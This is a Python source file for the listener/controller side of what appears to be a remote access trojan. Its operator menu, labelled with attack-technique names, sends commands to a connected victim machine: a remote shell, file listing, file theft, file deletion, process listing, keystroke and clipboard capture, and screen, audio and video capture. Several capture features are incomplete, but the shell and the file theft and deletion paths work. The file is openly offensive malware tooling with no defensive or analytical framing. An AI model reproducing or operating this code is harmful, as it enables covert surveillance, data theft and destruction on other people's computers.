#!/usr/bin/python3

#*********************************************************************

#import socket

import socket
import struct
import os
import tqdm
import time

IP = socket.gethostbyname(socket.gethostname())
PORT = 40005
ADDR = (IP, PORT)
SIZE = 1024
FORMAT = "utf-8"

SEPARATOR = "<SEPARATOR>"
BUFFER_SIZE = 4096 # send 4096 bytes each time step

#*********************************************************************

def interface_command():

	print("\nCommand interface:\n")

	print("\t[info] System Information Discovery;\n")
	print("\t[cmd] Command-Line Interface;\n")
	print("\t[files <path>] File and Directory Discovery;\n")
	print("\t[copy <path>] Remote File Copy;\n")
	print("\t[delite <path>] File Deletion;\n")
	print("\t[process] Process Discovery;\n")
	print("\t[get_input] Input Capture;\n")
	print("\t[get_clipboard] Clipboard Data;\n")
	print("\t[get_screen] Screen Capture;\n")
	print("\t[get_audio] Audio Capture;\n")
	print("\t[get_video] Video Capture;\n")
	print("\t[exit] Exit and End.\n")

	print("\nInput comannd only in brackets.\n")


def send_file_modify(client,filename):
    # get the file size
    filesize = os.path.getsize(filename)
    # send the filename and filesize
    client.send(f"{filename}{SEPARATOR}{filesize}".encode())
    progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    total=0
    with open(filename, "rb") as f:
        for _ in progress:
             while total != filesize:
                # read the bytes from the file
                bytes_read = f.read(BUFFER_SIZE)
                if total == filesize:
                    # file transmitting is done
                    break
                # we use sendall to assure transimission in 
                # busy networks
                client.sendall(bytes_read)
                # update the progress bar
                progress.update(len(bytes_read))
                total += len(bytes_read)
    f.close()
    
def get_file_modify(socket):
    # receive the file infos
    # receive using client socket, not server socket
    received = socket.recv(BUFFER_SIZE).decode()
    filename, filesize = received.split(SEPARATOR)
    # remove absolute path if there is
    filename = os.path.basename(filename)
    # convert to integer
    filesize = int(filesize)
    # start receiving the file from the socket
    # and writing to the file stream
    progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    total=0
    with open(filename, "wb") as f:
         for _ in progress:
            while total != filesize:
            # read 1024 bytes from the socket (receive)
                bytes_read = socket.recv(BUFFER_SIZE)
                if not bytes_read:    
                    # nothing is received
                    # file transmitting is done
                    break
                # write to the file the bytes we just received
                f.write(bytes_read)
                # update the progress bar
                progress.update(len(bytes_read))
                total += len(bytes_read)
    f.close()



def _send_simple(client,filename):
    client.sendall(filename.encode())
    file = open(filename, "rb")
    text = file.read()
    file.close()
    client.send(text)

def _recieve_simple(conn):
    file=conn.recv(1024)
    filename=file.decode()
    data=conn.recv(80000000)
    file = open(filename, "wb")
    file.write(data)
    file.close()

#*********************************************************************


def main():

    print("[STARTING] Server is starting.")
    
    """ Staring a TCP socket. """
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    """ Bind the IP and PORT to the server. """
    server.bind(ADDR)

    """ Server is listening, i.e., server is now waiting for the client to connected. """
    server.listen()
    print("[LISTENING] Server is listening.")

    """ Server has accepted the connection from the client. """
    conn, addr = server.accept()
    print(f"[NEW CONNECTION] {addr} connected.")

    interface_command()

    print("\nInput your command:\n")


    while True:

        command=""

        command=input(">")

        if command=="info": #okey
            conn.send(command.encode())
            data=conn.recv(10000)
            print(data.decode())
            continue
        elif command=="cmd": #okey
            conn.send(command.encode())
            print("\nOther terminal or command line is open...\n")

            triger=True

            while triger==True:
                command=""
                command=input("Other terminal >") 
                conn.send(command.encode())
                if command!="exit":
                    data=conn.recv(10000)
                    print(data.decode())
                    
                elif command=="exit":
                    triger=False
                    break
            print("\nOther terminal or command line is close...\n")
            continue
        elif str(command[0:5])=="files": #okey
            conn.send(command.encode())
            data=conn.recv(10000)
            print(data.decode())
            continue
        elif str(command[0:4])=="copy": #okey
            conn.send(command.encode())
            get_file_modify(conn)
            continue
        elif str(command[0:6])=="delite": #okey
            conn.send(command.encode())
            data=conn.recv(10000)
            print(data.decode())
            continue
        elif command=="process": #okey
            conn.send(command.encode())
            data=conn.recv(10000)
            print(data.decode())
            continue
        elif command=="get_input":
            conn.send(command.encode())
            conn.send(command.encode())
            data=conn.recv(10000)
            print(data.decode())
            continue
        elif command=="get_clipboard":
            conn.send(command.encode())
            conn.send(command.encode())
            data=conn.recv(10000)
            print(data.decode())
            continue
        elif command=="get_screen":#okey
            conn.send(command.encode())
            #data=conn.recv(10000)
            #print(data.decode())
            continue
        elif command=="get_audio":#okey
            conn.send(command.encode())
            # conn.send(command.encode())
            # data=conn.recv(10000)
            # print(data.decode())
            continue
        elif command=="get_video":#okey
            conn.send(command.encode())
            # conn.send(command.encode())
            # data=conn.recv(10000)
            # print(data.decode())
            continue
        elif command=="exit": #okey
            print("\nClose the connection and exit for the program.\n")
            break

 

    """ Closing the connection from the client. """
    conn.close()
    print(f"[DISCONNECTED] {addr} disconnected.")

if __name__ == "__main__":
    main()

#*********************************************************************

   